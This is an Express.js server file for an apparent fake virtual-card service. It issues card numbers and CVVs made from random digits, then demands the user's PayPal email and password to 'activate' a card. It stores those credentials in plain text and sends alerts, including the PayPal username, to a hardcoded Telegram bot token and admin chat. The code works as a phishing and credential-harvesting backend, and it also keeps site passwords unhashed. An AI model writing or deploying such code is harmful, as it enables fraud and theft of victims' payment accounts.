const express = require('express');
const cors = require('cors');
const fs = require('fs').promises;
const path = require('path');
const jwt = require('jsonwebtoken');
const axios = require('axios'); // For Telegram API calls

const app = express();
app.use(cors());
app.use(express.json());

const dataFile = path.join(__dirname, 'data.json');
const JWT_SECRET = 'your-secure-secret-key'; // Replace with a strong secret in production
const TELEGRAM_BOT_TOKEN = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo';
const TELEGRAM_CHAT_ID_ADMIN = '6270110371';

async function readData() {
    try {
        const data = await fs.readFile(dataFile, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { users: {}, cards: {} };
    }
}

async function writeData(data) {
    await fs.writeFile(dataFile, JSON.stringify(data, null, 2));
}

function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });

    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (error) {
        return res.status(403).json({ error: 'Invalid token' });
    }
}

async function sendTelegramNotification(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID_ADMIN,
            text: message
        });
    } catch (error) {
        console.error('Telegram notification error:', error.message);
    }
}

app.post('/api/auth/signup', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
        return res.status(400).json({ error: 'Invalid username or password' });
    }

    const data = await readData();
    if (data.users[username]) return res.status(400).json({ error: 'User already exists' });

    data.users[username] = { password }; // In production, hash password with bcrypt
    await writeData(data);
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
    await sendTelegramNotification(`New user ${username} signed up at ${new Date().toLocaleString()}`);
    res.json({ token });
});

app.post('/api/auth/login', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username and password are required' });

    const data = await readData();
    const user = data.users[username];
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
    await sendTelegramNotification(`User ${username} logged in at ${new Date().toLocaleString()}`);
    res.json({ token });
});

app.post('/api/cards/generate', authenticateToken, async (req, res) => {
    const { name, expDate, amount } = req.body;
    const parsedAmount = parseFloat(amount);
    if (!name || !expDate || isNaN(parsedAmount) || parsedAmount <= 0 || !/^\d{6}$/.test(expDate)) {
        return res.status(400).json({ error: 'Invalid input: Name, valid expiration (MMYYYY), and amount (>0) required' });
    }

    const data = await readData();
    const cardId = `card_${Date.now()}`;
    const card = {
        cardId,
        number: Math.random().toString().slice(2, 16).padEnd(16, '0'),
        cvv: Math.floor(100 + Math.random() * 900).toString(),
        name,
        expDate,
        amount: parsedAmount,
        status: 'Pending',
        owner: req.user.username
    };
    data.cards[cardId] = card;
    await writeData(data);
    await sendTelegramNotification(`Card generated for ${req.user.username}: ID ${cardId}, Amount $${parsedAmount}`);
    res.json(card);
});

app.get('/api/cards', authenticateToken, async (req, res) => {
    const data = await readData();
    const userCards = Object.values(data.cards).filter(card => card.owner === req.user.username);
    res.json(userCards);
});

app.delete('/api/cards/:cardId', authenticateToken, async (req, res) => {
    const data = await readData();
    const card = data.cards[req.params.cardId];
    if (!card || card.owner !== req.user.username) {
        return res.status(404).json({ error: 'Card not found or unauthorized' });
    }

    delete data.cards[req.params.cardId];
    await writeData(data);
    await sendTelegramNotification(`Card ${req.params.cardId} deleted by ${req.user.username}`);
    res.json({ message: 'Card deleted' });
});

app.get('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
    const data = await readData();
    const card = data.cards[req.params.cardId];
    if (!card || card.owner !== req.user.username) {
        return res.status(404).json({ error: 'Card not found or unauthorized' });
    }

    const response = { cardId: card.cardId, status: card.status };
    if (card.paypalUsername && card.paypalPassword) {
        response.paypalUsername = card.paypalUsername;
        response.paypalPassword = card.paypalPassword;
    }
    res.json(response);
});

app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'PayPal email and password are required' });

    const data = await readData();
    const card = data.cards[req.params.cardId];
    if (!card || card.owner !== req.user.username) {
        return res.status(404).json({ error: 'Card not found or unauthorized' });
    }

    card.status = 'Activated';
    card.paypalUsername = username;
    card.paypalPassword = password;
    data.cards[req.params.cardId] = card;
    await writeData(data);
    await sendTelegramNotification(`Card ${req.params.cardId} activated by ${req.user.username} with PayPal ${username}`);
    res.json({ message: 'Card activated', cardId: req.params.cardId, status: card.status });
});

app.get('/api/cards/logs', authenticateToken, async (req, res) => {
    const data = await readData();
    const logs = Object.values(data.cards)
        .filter(card => card.status === 'Activated')
        .map(card => ({ user: card.owner, time: Date.now() }));
    res.json(logs);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
